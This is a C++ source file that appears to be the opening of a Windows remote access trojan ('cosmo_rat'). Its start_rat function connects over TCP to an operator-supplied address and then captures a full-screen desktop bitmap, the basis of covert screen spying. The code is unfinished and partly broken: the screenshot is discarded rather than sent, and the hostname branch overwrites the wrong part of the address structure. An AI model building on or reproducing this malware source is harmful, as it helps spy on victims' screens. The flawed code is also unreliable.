#include "cosmo_rat.h"

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <Windows.h>
#include <string>
#include <exception>
#include <thread>
#include <d3d9.h>
#include <d3d.h>

#include "die_socket.h"

SOCKET Client_rat;

void start_rat() {

	char message[1024];
	char in[1014];
	char adrserv[INET_ADDRSTRLEN];

	WSAData data;
	WORD version = MAKEWORD(2, 2);
	int res = WSAStartup(version, &data);
	if (res != 0) {

		printf("Socket()error");

		die_socket();
		exit(-1);
	}

	Client_rat = socket(AF_INET, SOCK_STREAM, 0);
	if (Client_rat < 0) {

		printf("Socket()error");
		die_socket();
		exit(-1);
	}

	printf("Ip: ");
	std::cin >> adrserv;

	int port;
	printf("Port: ");
	std::cin >> port;

	struct sockaddr_in connect_c;

	connect_c.sin_family = AF_INET;
	connect_c.sin_port = htons(port);

	HOSTENT *hst;

	if (inet_addr(adrserv) != INADDR_NONE)
		connect_c.sin_addr.s_addr = inet_addr(adrserv);

	else {

		if (hst = gethostbyname(adrserv))
			((unsigned long *)&connect_c)[0] =
			((unsigned long **)&hst->h_addr_list)[0][0];

		else {

			std::cout << "Invalid address: " << adrserv << std::endl;

			closesocket(Client_rat);
			die_socket();
			exit(-1);
		}
	}

	if (connect(Client_rat, (sockaddr *)&connect_c, sizeof(connect_c))) {

		printf("Connect()error");

		die_socket();
		exit(-1);
	}

	printf("{OK}");

	HDC hdc = GetDC(NULL); // get the desktop device context
	HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself

	// get the height and width of the screen
	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);

	// create a bitmap
	HBITMAP hbDesktop = CreateCompatibleBitmap(hdc, width, height);

	// use the previously created device context with the bitmap
	SelectObject(hDest, hbDesktop);

	// copy from the desktop device context to the bitmap device context
	// call this once per 'frame'
	BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

	// after the recording is done, release the desktop context you got..
	ReleaseDC(NULL, hdc);

	// ..delete the bitmap you were using to capture frames..
	DeleteObject(hbDesktop);

	// ..and delete the context you created
	DeleteDC(hDest);
}